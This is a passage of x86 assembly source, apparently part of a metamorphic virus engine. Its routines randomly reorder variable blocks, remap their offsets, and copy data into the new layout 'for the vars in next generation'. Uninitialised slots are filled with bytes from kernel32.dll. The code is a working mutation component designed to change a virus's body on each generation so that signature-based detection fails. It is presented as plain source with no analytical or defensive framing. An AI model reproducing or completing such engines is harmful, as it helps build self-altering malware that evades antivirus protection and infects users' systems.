mix_variables:
       pushad

       mov esi,ofs order_var_table
       mov edi,esi
       sub eax,eax
       mov ecx,NUMBER_OF_VAR_BLOCKS
  @@store_order:
       stosb                            ;init order to 0,1,2,3...
       inc eax
       loop @@store_order

       mov ecx,NUMBER_OF_CHANGES
  @@mix:
       push NUMBER_OF_VAR_BLOCKS
       call rnd
       mov ebx,eax
       push NUMBER_OF_VAR_BLOCKS
       call rnd
       mov dl,[esi+ebx]
       xchg dl,[esi+eax]                ;mix order
       mov [esi+ebx],dl
       loop @@mix

       mov ecx,NUMBER_OF_VAR_BLOCKS
       mov edi,ofs new_var_table
       sub ebx,ebx
  @@build_new:
       sub eax,eax
       lodsb
       mov eax,[ofs var_table+eax*4]        ;get offset/size
       and eax, 0ffffh                      ;clear old offset

       shl ebx,16
       or eax, ebx                      ;put new offset
       stosd                            ;save new infoblock
       and eax, 0fffh                   ;clear flags from size
       shr ebx,16
       add ebx,eax                      ;increase new offset by size

       loop @@build_new

       popad
       ret


;arg=old offset
get_new_var_ofs:
       pushad

       mov esi,ofs var_table
       sub ebx,ebx
  @@find_block:
       mov ebp,[esp+8*4+4]
       lodsd
       mov ecx,eax
       and ecx,0fffh
       shr eax,16
       sub ebp,eax
       jb @@not
       cmp ebp,ecx                     ;inside that block?
       jb @@found
  @@not:
       inc ebx                          ;block counter
       jmp @@find_block
  @@found:

       mov esi,ofs order_var_table
       sub edx,edx
  @@translate:
       lodsb
       sub al,bl                        ;old block is equivalent to what new?
       jz @@section_found
       inc edx
       jmp @@translate
  @@section_found:

       mov ebx,[ofs new_var_table+edx*4]      ;offset
       shr ebx,16
       add ebx,ebp
       mov [esp+7*4],ebx

       popad
       ret 4


;arg2=old data
;arg1=data destiny
copy_data:
       pushad

       mov edi,[esp+8*4+4]

       mov esi, ofs order_var_table
       mov ebx,NUMBER_OF_VAR_BLOCKS

  @@copy_section:
       sub eax,eax
       lodsb
       push esi

       mov ecx,[ofs var_table+eax*4]
       bt ecx,15                       ;mark detected?
       jnc @@novartable

       mov esi, ofs new_var_table       ;use new var_table in memcopy, coz
       jmp @@copy                       ;it will be the right map for the
                                        ;vars in next generation

  @@novartable:
       bt ecx,14                       ;rndfill detected?
       jnc @@norndfill

;       mov esi, 0bff70250h     ;zero area from kernel32.dll
       push 200h
       call rnd
       mov esi,eax                     ;fill with data from kernel32.dll the
       add esi,[_GetModuleHandleA]     ;variables unitialized(rnd fill)
       jmp @@copy

  @@norndfill:
       mov esi,ecx
       shr esi,16
       add esi,[esp+8*4+8+4]              ;old data base address
  @@copy:
       and ecx, 0fffh
       rep movsb

       pop esi
       dec ebx
       jnz @@copy_section

       mov [esp.Pushad_edi],edi
       popad
       ret 4*2

